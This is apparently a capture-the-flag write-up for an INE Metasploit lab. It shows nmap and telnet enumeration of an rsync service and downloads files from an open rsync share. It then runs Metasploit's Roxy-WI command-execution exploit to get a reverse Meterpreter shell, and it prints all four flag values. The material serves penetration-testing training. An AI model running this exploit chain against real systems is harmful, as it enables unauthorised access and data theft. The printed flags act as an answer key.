# Host & Network Penetration Testing: The Metasploit Framework CTF 2

## Target
* `http://target.ine.local`

## Tools used:
* `nmap`

---
### Flag 1: Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
we start with a simple `nmap` scan
```bash
msf6 > db_nmap -Pn -sV target1.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 12:59 IST
[*] Nmap: Nmap scan report for target1.ine.local (192.194.59.3)
[*] Nmap: Host is up (0.000025s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 873/tcp open  rsync   (protocol version 31)
[*] Nmap: MAC Address: 02:42:C0:C2:3B:03 (Unknown)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
msf6 > 
```
We use the telnet server and find that `rsync` is available, so we pivot to it to get the next flag
```bash
┌──(root㉿INE)-[~]
└─# telnet target1.ine.local 873
Trying 192.194.59.3...
Connected to target1.ine.local.
Escape character is '^]'.
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4

@ERROR: protocol startup error
Connection closed by foreign host.

┌──(root㉿INE)-[~]
└─# rsync target1.ine.local::
backupwscohen   FLAG1_1509babb02ee4cfb98ebc1ad3c048c03
```
Flag: **1509babb02ee4cfb98ebc1ad3c048c03**
### Flag 2: The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
We download the available files and look thorugh them
```bash
┌──(root㉿INE)-[~]
└─# rsync target1.ine.local::backupwscohen                                                                                                                                                 
drwxr-xr-x          4,096 2026/01/25 12:56:26 .
-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt
-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd
-rw-r--r--             39 2026/01/25 12:56:26 pii_data.xlsx

┌──(root㉿INE)-[~]
└─# mkdir backupwscohen                              
┌──(root㉿INE)-[~]
└─# rsync -av target1.ine.local::backupwscohen ./backupwscohen/                              
receiving incremental file list
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20

┌──(root㉿INE)-[~]
└─# ls backupwscohen/                                                                                                                                                                      
office_staff.vhd  pii_data.xlsx  TPSData.txt
┌──(root㉿INE)-[~]
└─# cat backupwscohen/pii_data.xlsx 
FLAG2_528b62143a6e45d686a14b862d1e3c5b
```
This gives up the next flag  
Flag: **528b62143a6e45d686a14b862d1e3c5b**

### Flag 3: Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
We run an `nmap` scan on the final machine
```bash
msf6 > db_nmap -Pn target2.ine.local -sV
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 13:16 IST
[*] Nmap: Nmap scan report for target2.ine.local (192.194.59.4)
[*] Nmap: Host is up (0.000026s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT    STATE SERVICE  VERSION
[*] Nmap: 80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
[*] Nmap: 443/tcp open  ssl/http Apache httpd 2.4.52
[*] Nmap: MAC Address: 02:42:C0:C2:3B:04 (Unknown)
[*] Nmap: Service Info: Host: roxy-wi.example.com
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
msf6 > 
```
We knwo that the webserver is a `Roxy-WI` server, so we load up the relevant module in `msf`
```bash
msf6 exploit(linux/http/roxy_wi_exec) > set LHOST eth1
LHOST => eth1
msf6 exploit(linux/http/roxy_wi_exec) > run

[*] Started reverse TCP handler on 192.194.59.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.194.59.4:443 is vulnerable!
[*] 192.194.59.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Sending stage (24772 bytes) to 192.194.59.4
[*] Meterpreter session 1 opened (192.194.59.2:4444 -> 192.194.59.4:37026) at 2026-01-25 13:33:16 +0530

meterpreter > 
```
We run a search for any .txt files
```bash
/flag.txt
cat /flag.txt
cat /flag.txt
www-data@target2:/var/www/haproxy-wi/app$ FLAG3_7eb74797bce14b6d857c508614f542f4
```
This gives us the next flag  
Flag: **7eb74797bce14b6d857c508614f542f4**
### Flag 4: Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.
We search in cron.d to get the final flag.
```bash
www-data@target2:/etc/cron.d$ ls
ls
www-data@target2:/etc/cron.d$ e2scrub_all
www-data-cron
cat www-data-cron
cat www-data-cron
www-data@target2:/etc/cron.d$ * * * * * www-data echo "FLAG4_aa2fb965277547c288ce2c8d217a9887"
```
Flag: **aa2fb965277547c288ce2c8d217a9887**